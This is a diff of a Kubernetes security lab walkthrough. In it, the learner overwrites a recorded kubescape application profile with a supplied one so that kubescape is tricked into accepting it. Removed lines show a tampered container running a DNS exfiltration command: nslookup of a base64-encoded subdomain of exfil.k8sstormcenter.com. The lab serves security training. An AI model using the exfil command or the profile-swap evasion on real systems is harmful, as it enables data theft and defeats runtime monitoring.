@@ -103,16 +103,20 @@ if that works, let it loop
 while true; do curl localhost:8080/ping.php?ip=172.16.0.2; sleep 10; done
 ```
 Do not kill the looping.
-Please, switch back to the original :tab-locator-inline{text='dev-machine' name='dev-machine'} tab, and you are ✅
+Please, switch back to the original :tab-locator-inline{text='dev-machine' name='dev-machine'} tab, and proceed
 
 
 
-## 4 Wait for kubescape to settle
+## 5 Wait for kubescape to settle
 
-TODO: replace with more production like method
+TODO: replace with more production like method.
 
-We ll wait until we have an application profile again and we ll throw it away
+The `garbage out, patch in` method :
 
+We ll wait until we have an application profile again and we ll throw it away.
+
+
+Lets check the configuration in order to understand if the setup is any different from Module 1:
 ```sh
 kubectl describe cm -n honey ks-cloud-config
 kubectl describe RuntimeRuleAlertBinding all-rules-all-pods
@@ -120,29 +124,50 @@ kubectl describe RuntimeRuleAlertBinding all-rules-all-pods
 
 ```sh
 kubectl get applicationProfile -A
-kubectl get applicationProfile replicaset-webapp-75c688bfc4 -o yaml > ~/originalappprofile.yaml
 ```
-
 ```
 laborant@dev-machine:webapp_t$ kubectl get applicationProfile -A
 NAMESPACE   NAME                           CREATED AT
 default     replicaset-webapp-75c688bfc4   2025-04-25T12:38:28Z
 ```
 
+```sh
+export rs=$(kubectl get replicaset -n default -o jsonpath='{.items[0].metadata.name}')
+kubectl describe applicationprofile replicaset-$rs
+```
+```sh
+kubectl get applicationProfile replicaset-$rs  -o yaml > ~/originalappprofile.yaml
+```
+
 now edit that profile (so it keeps it name), but use the content of the one from Module 1!!!
-
-
-## 5 watch how k3s is different from k8s
-
-## 6 same game with the supply chain corruption
-
-if you deployed the tampered one, notice
-
+```sh   
+echo $rs
+envsubst < /home/laborant/honeycluster/traces/kubescape-verify/attacks/webapp/bob_applicationprofile.yaml > /home/laborant/honeycluster/traces/kubescape-verify/attacks/webapp/bob.yaml
 ```
-    - args:
-      - /bin/sh
-      - -c
-      - nslookup NjQgYnl0ZXMgZnJvbSAxNzIuMTYuMC4yOiBpY21wX3NlcT0zIHR0bD02MyB0aW1lPTAuNDUzIG1z.exfil.k8sstormcenter.com
-        > /dev/null 2>&1
-      path: /bin/sh
+
+`patch` the ping-profile:
+
+```sh
+kubectl apply -f /home/laborant/honeycluster/traces/kubescape-verify/attacks/webapp/bob.yaml
 ```
+Make sure you didnt wake ~~the dragon~~ kubescape
+```
+kubectl logs -n honey -l app=node-agent
+```
+there should be no additional logs, only the stop of the above profile, similar to:
+
+```json
+{"level":"info","ts":"2025-04-25T16:25:13Z","msg":"RBCache - ruleBinding added/modified","name":"/all-rules-all-pods"}
+{"level":"info","ts":"2025-04-25T17:05:15Z","msg":"start monitor on container","container ID":"d4d78869d6b20066565d10c39fa37d1c6d3d5d83161b4d7b3d75783d53653ae8","k8s workload":"default/webapp-8b697d7f9-h9mx4/ping-app","ContainerImageDigest":"sha256:31eb54dc4f5e3537a807e1a5cbc2de9d6c0a5f4e423a5137627e664748f03d7f","ContainerImageName":"ghcr.io/k8sstormcenter/webapp:latest"}
+{"level":"info","ts":"2025-04-25T17:10:15Z","msg":"stop monitor on container - monitoring time ended","container ID":"d4d78869d6b20066565d10c39fa37d1c6d3d5d83161b4d7b3d75783d53653ae8","k8s workload":"default/webapp-8b697d7f9-h9mx4/ping-app"}
+```
+
+
+Quick Summary:
+
+We as customer deployed `webapp`, we didnt check its signature, we recorded a profile and threw away that profile by overwriting it with the profile from Module 1, aka `BoB`.
+We did this to trick kubescape into believing, it has recorded the supplied `BoB`  (the metadata of the profile are correct). 
+
+## 6 watch how k3s is different from k8s
+
+
